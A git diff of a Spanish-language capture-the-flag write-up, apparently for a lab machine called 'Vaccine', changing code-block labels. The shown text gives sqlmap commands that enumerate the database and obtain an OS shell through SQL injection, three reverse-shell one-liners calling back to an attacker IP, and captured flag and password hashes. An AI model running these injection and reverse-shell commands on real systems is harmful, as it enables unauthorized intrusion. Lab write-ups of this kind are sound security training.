@@ -151,11 +151,11 @@ Parameter: search (GET)
 ```
 
 #### ahora que sabemos el nombre de la base de datos podemos enumerarla usando el mismo comando sqlmap con una pequeña variante: 
-```css
+```python
 sqlmap -D public --tables -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
 ```
 conseguimos una tabla llamada cars asi que buscaremos esa tabla con el siguiente comando
-```css
+```python
 sqlmap -D public -T cars --culumns -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
 ```
 
@@ -163,7 +163,7 @@ sqlmap -D public -T cars --culumns -u "http://vaccine/dashboard.php?search=a" --
 
 #### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.
 
-```css 
+```python
 sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
 ```
 
@@ -171,29 +171,29 @@ sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID
 
 #### de esta manera hemos conseguido una shell interactiva. pero esta shell esta un poco limitada asi que podemos intentar enviarnos una reverse shell a nuestro equipo para poder interactuar de mejor manera.
 
-```css
+```python
 sh -i >& /dev/tcp/10.10.15.157/8001 0>&1
 ```
 
-```css
+```python
 bash -c 'bash -i >& /dev/tcp/10.10.15.157/8001 0>&1'
 ```
 
 #### con esta bash notamos que perdemos coneccion. asi que usaremos una enviada por netcat para intentar resolver esto.
 
-```css
+```python
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
 ```
 
 ### despues de esto hacemos tratamiento tty y empezamos a examinar la maquina.
 user.txt
-```css
+```python
 ec9b13ca4d6229cd5cc1e09980965bf7
 ```
 
 #### vamos a navegar hasta el directorio donde esta alojada la base de datos
 passid:
-```css
+```python
 2cb42f8734ea607eefed3b70af13bbd3
 ```
 db:id
